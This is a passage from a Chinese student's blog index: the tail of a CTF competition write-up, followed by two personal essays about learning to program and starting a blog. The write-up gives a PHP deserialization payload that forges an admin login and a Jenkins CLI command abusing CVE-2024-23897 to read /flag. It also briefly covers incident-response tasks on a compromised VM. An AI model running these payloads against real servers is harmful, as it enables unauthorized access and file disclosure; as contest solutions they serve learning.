$this-&gt;pass==&quot;admin123&quot;)&#123; return True; &#125; &#125;&#125;if(isset($_GET[&#x27;flag&#x27;]))&#123; $a=unserialize($_GET[&#x27;flag&#x27;]); if($a-&gt;login()) &#123; echo $flag; &#125;&#125; 经典的反序列化漏洞， 写一手逆向代码， 得到payload ：O:5:”login”:2: {s:4:”user”;s:5:”admin”;s:4:”pass”;s:8:”admin123”;} 得到 flag Jenkins 题目描述：坏了，我不会 java ，这怎么打？？？ hint: 容器启动较慢，请耐心等候，完全启动预计需要 10min flag 位于 &#x2F;flag 在网上看看有没有现成的 poc 之类的？ 等网页加载完后是经典的登陆界面，利用网络资源有 poc ， 首先在前端页面输入 jnlpJars&#x2F;jenkins-cli.jar ，可以下载到 jar 文件， 然后再打开 kali ，在命令行中输入：java -jar ‘&#x2F;..&#x2F;..&#x2F;..&#x2F;jenkins-cli.jar -s -http 47.121.201.96:50527 help 1 “@&#x2F;flag’’ 得到 flag #参考了 Jenkins 文件读取漏洞拾遗（ CVE-2024-23897 ） | 离别歌 Forensics （附件忘了保存了 :( ）应急响应 -1 钓鱼邮件 近日， Peng 的个人电脑遭到黑客攻击，请你帮 Peng 溯源攻击链。 黑客发送的钓鱼邮件的发件地址是？ 例： XAUTCTF{ 123456@qq.com} hint ：部分文件为真实病毒样本，请不要在物理机运行 翻一翻 此电脑 挂载虚拟机后进入， 根据提示，点击此电脑，有一个寒假通知，点击后即可看到邮件地址。 应急响应 -2 一句话木马 题目描述：黑客写入的一句话木马的连接密码是？ 例： XAUTCTF{cmd} 在虚拟机上下载 D盾，查找后门文件可以看到有两个可疑文件， 点开可以看到一句话马 🐎 ，得到是 POST 的easyshell ，为 flag 应急响应 -3 后门用户 题目描述：黑客的添加的后门用户是？ 例： XAUTCTF{hacker} 在虚拟机上的控制面板的用户账户可得到后门用户 wshcaker$ 应急响应 -4 病毒文件 题目描述：黑客植入的病毒程序的外连 ip 及端口是 在cmd 里输入 netstat -naob 可得到外连 IP 地址 应急响应 -5 勒索钱包 题目描述：黑客留下的勒索钱包地址是？ 例： XAUTCTF{1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa} 直接点击桌面上的 readme.txt 可得到","categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"}],"tags":[{"name":"比赛个人WP","slug":"比赛个人WP","permalink":"https://incldue.github.io/tags/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/"}]},{"title":"大学的近期Coding之旅及随笔(2024年)","slug":"大学的近期coding之旅及随笔-2024年","date":"2024-10-23T16:00:00.000Z","updated":"2025-06-12T06:20:25.238Z","comments":true,"path":"2024/10/24/大学的近期coding之旅及随笔-2024年/","permalink":"https://incldue.github.io/2024/10/24/%E5%A4%A7%E5%AD%A6%E7%9A%84%E8%BF%91%E6%9C%9Fcoding%E4%B9%8B%E6%97%85%E5%8F%8A%E9%9A%8F%E7%AC%94-2024%E5%B9%B4/","excerpt":"也算是2024年1024程序员节的一篇投稿:)","text":"值此1024程序员节，祝各位节日快乐哈正是秋天，古人云：自古逢秋悲寂寥，我言秋日胜春朝。今天也算是有感而发吧！纯属个人的感想，望各位大佬指正。 进入正题~~之前学编程，只是单纯的出于兴趣，喜爱那种刷完竞赛题后看到AC100的心满意足，也享受绞尽脑汁后解开竞赛题的豁然开朗。随着上了大学，系统学习了操作系统、计算机组成等底层逻辑，在CTF比赛中查看文件反汇编后的结构抑或是MISC的脑洞大开、PWN的二进制旅程，都让作为萌新的我大开眼界，也终于get到了“山外有山，人外有人”。 现在C语言基本学完，也初步了解STL，数据结构等，在CTF比赛中边刷边学学到的各个领域的零碎知识，感觉之前学的其实只是冰山一角，感觉就是通往计算机领域的🚄才刚刚出站，美得令人窒息的风景还远在路上，等着我们去探索。 在打CTF的过程中，我发现自己实在是太渺小了，感觉就是井底之蛙，要学的东西实在是太多了。于是呢，为了建立自己的知识库，也是稍稍装一下（bushi）所以就建立自己的blog，既方便了自己，也便于他人查看，同时呢，也可以作为自己一步一个脚印成长的见证。 回想以前高中的时候，我在家就自学计网、密码学，本来学得畅快淋漓，但是奈何还有在校学习，所以没有很好地平衡学习与自己的兴趣，导致学的很累。现在上大学了，成天和代码打交道，既要刷刷leetcode、debug，还要肝高数、线代，感觉真的非常地“充实”啊！特别是在打CTF的那段时间里，脑细胞直接给我干到野兽模式。 那时，打CTF时flag总是离我而去，让我思考究竟该不该走这条路。但是想到《牧羊少年奇幻之旅》中的“没有一颗心，会因为追求梦想而受伤。当你真心渴望某样东西时，整个宇宙都会来帮忙。”于是乎，我重振旗鼓，真正全身心投入到CTF的狂欢之中。当我享受到那种自由灵魂的探索、狂欢时，感觉真的很爽欸！当然，那次CTF也获得第二的名次，让作为新手的我也为之一振！ 感慨~~钱德勒曾说“说一声再见，就是死去一点点。”那我只能对之前脆弱、无知、渺小的我说再见了！心若不死，则道不生。一点点成长。共勉。💪","categories":[{"name":"杂谈","slug":"杂谈","permalink":"https://incldue.github.io/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://incldue.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"第一次blog的Hello World(留作纪念~~)","slug":"hello-world","date":"2024-10-12T16:00:00.000Z","updated":"2025-06-12T14:33:16.733Z","comments":true,"path":"2024/10/13/hello-world/","permalink":"https://incldue.github.io/2024/10/13/hello-world/","excerpt":"Hello blog~","text":"第一篇文章，来扯一下淡…这是我的第一篇文章，请大家多多支持我！ 初衷其实，在我读高中时，学习编程、翻看别的大佬的blog的时候，就已经萌生了自己写blog的想法。奈何…懂的都懂，要考高考，所以呢，计划搁置了很久。终于考完高考，我也能尽情遨游在编程、CS的海洋中了。 小小的实现现在是在读大一，看到有大二的CTF学长搭建了自己的blog，于是…手痒啊！就这样，degu8ger的blog诞生了！最初，觉得搭建blog要从零开始完全自己手搓一个出来，但是如今看来，技术飞速发展，都有现成的框架、demo了，只需引用一下即可。所以，事不宜迟，我选用了Hexo，大概断断续续地捣鼓了有三天吧，一个简陋的demo版出现了！！后续还得自己购置服务器(bushi)或者租一台，弄个域名…现在大一只看到经费在燃烧哇。其实呢，看到自己把别的佬的resources学到并记录在互联网这样一个大家庭中，也算是一种对自己努力学习的见证吧！ 感触之前遇到CS上的一些问题，在互联网上搜索，看到好的、精妙绝伦的就会点击收藏在收藏夹中。时间久了，收藏夹已经满了，而自己没有把他们分门别类的分好，便于自己以后查找。这也是我下定决心搭建blog的其中一个原因吧！特别是最近在疯狂肝CTF，在网上查找了a deluge of 信息，看到大佬的blog做得精彩绝伦、赏心悦目，自己已然心动。出于对技术的渴望也是对自己近一段时间以来获取信息的掌握度，搭建自己的blog也是对自己成长的见证。搭建blog，既是对自己在编程、学CS上的一点点见证，同时也可以锻炼自己的代码能力，包括后期维护啥的。将来工作时也可以呢…欸，不能明说。任何时候起步都不晚，重要的是起步了，就一切都好说。","categories":[{"name":"杂谈","slug":"杂谈","permalink":"https://incldue.github.io/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://incldue.github.io/tags/%E9%9A%8F%E7%AC%94/"}]}],"categories":[{"name":"CTF相关","slug":"CTF相关","permalink":"https://incldue.github.io/categories/CTF%E7%9B%B8%E5%85%B3/"},{"name":"安全相关","slug":"安全相关","permalink":"https://incldue.github.io/categories/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"},{"name":"程序设计","slug":"程序设计","permalink":"https://incldue.github.io/categories/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"},{"name":"杂谈","slug":"杂谈","permalink":"https://incldue.github.io/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"比赛个人WP","slug":"比赛个人WP","permalink":"https://incldue.github.io/tags/%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BAWP/"},{"name":"CTF基础知识","slug":"CTF基础知识","permalink":"https://incldue.github.io/tags/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"日常练习","slug":"日常练习","permalink":"https://incldue.github.io/tags/%E6%97%A5%E5%B8%B8%E7%BB%83%E4%B9%A0/"},{"name":"Reverse","slug":"Reverse","permalink":"https://incldue.github.io/tags/Reverse/"},{"name":"pwn","slug":"pwn","permalink":"https://incldue.github.io/tags/pwn/"},{"name":"CTF入门","slug":"CTF入门","permalink":"https://incldue.github.io/tags/CTF%E5%85%A5%E9%97%A8/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://incldue.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"SRC挖洞","slug":"SRC挖洞","permalink":"https://incldue.github.io/tags/SRC%E6%8C%96%E6%B4%9E/"},{"name":"CTF赛题","slug":"CTF赛题","permalink":"https://incldue.github.io/tags/CTF%E8%B5%9B%E9%A2%98/"},{"name":"编程学习","slug":"编程学习","permalink":"https://incldue.github.io/tags/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"随笔","slug":"随笔","permalink":"https://incldue.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"哲思","slug":"哲思","permalink":"https://incldue.github.io/tags/%E5%93%B2%E6%80%9D/"}]}